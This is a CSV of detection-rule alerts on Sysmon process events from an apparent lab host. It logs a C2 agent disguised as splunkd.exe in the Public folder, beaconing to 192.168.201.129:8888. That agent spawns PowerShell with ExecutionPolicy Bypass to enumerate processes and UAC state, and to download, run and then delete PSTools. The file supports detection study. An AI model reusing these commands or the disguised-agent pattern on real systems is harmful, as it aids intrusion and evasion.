"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:26:32.783 +01:00","Csc.EXE Execution Form Potentially Suspicious Parent","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec ¦ Evas","T1059.005 ¦ T1059.007 ¦ T1218.005 ¦ T1027.004","sysmon",172733,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3464 ¦ PGUID: E9F06A57-9888-694A-F002-000000002300 ¦ ParentPID: 2592 ¦ ParentPGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.755","proc_creation_win_csc_susp_parent.yml","d37a7581-a20e-7fa8-95d7-d157c2c66c43","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:23:21.326 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172719,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-97C9-694A-E902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:23:21.320","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:03.202 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172721,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""tasklist /m >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2188 ¦ PGUID: E9F06A57-97F3-694A-EA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:03.200","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:52.253 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172724,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3748 ¦ PGUID: E9F06A57-9824-694A-EC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:52.243","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:56.253 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172727,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""echo $(get-uac)"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3660 ¦ PGUID: E9F06A57-9864-694A-EE02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:25:56.250","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.318 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172729,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.299","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:23:21.326 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172719,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-97C9-694A-E902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:23:21.320","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:03.202 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172721,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""tasklist /m >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2188 ¦ PGUID: E9F06A57-97F3-694A-EA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:03.200","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:52.253 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172724,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3748 ¦ PGUID: E9F06A57-9824-694A-EC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:52.243","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:56.253 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172727,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""echo $(get-uac)"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3660 ¦ PGUID: E9F06A57-9864-694A-EE02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:25:56.250","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.318 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172729,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$ps_url = \""https://download.sysinternals.com/files/PSTools.zip\"";$download_folder = \""C:\Users\Public\\\"";$staging_folder = \""C:\Users\Public\temp\"";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\""PSTools.zip\"" -DestinationPath $staging_folder;iex $staging_folder\""\pslist.exe\"" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\""PSTools.zip\"";Remove-Item $staging_folder -Recurse"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:26:32.299","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:23:21.326 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172719,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 7612 ¦ PGUID: E9F06A57-97C9-694A-E902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:23:21.320","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:03.202 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172721,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""tasklist /m >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2188 ¦ PGUID: E9F06A57-97F3-694A-EA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:03.200","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:52.253 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172724,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3748 ¦ PGUID: E9F06A57-9824-694A-EC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:24:52.243","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:56.253 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172727,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""echo $(get-uac)"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3660 ¦ PGUID: E9F06A57-9864-694A-EE02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:25:56.250","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_enum.evtx"
